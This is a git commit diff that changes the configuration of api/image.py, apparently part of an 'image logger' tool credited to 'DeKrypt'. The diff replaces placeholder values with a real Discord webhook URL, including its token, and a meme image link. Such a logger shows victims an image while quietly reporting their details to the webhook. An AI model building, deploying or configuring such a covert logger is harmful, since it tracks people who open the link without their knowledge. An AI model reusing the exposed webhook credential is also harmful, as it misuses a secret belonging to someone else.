c00f85096be9373c9bdb8451d8f1a1e740366c9d
execroot-sh <execroot.sh@gmail.com>
2025-02-24 22:12:00 +0200

    image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1343675362206290012/ddjpKAwvbq-DG-BmU2zytUGftpGMYYuRNM3OFc5R_F-d0W1G2PiUI5LSuFsG_oR472mE",
+    "image": "https://i.imgflip.com/uyw25.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
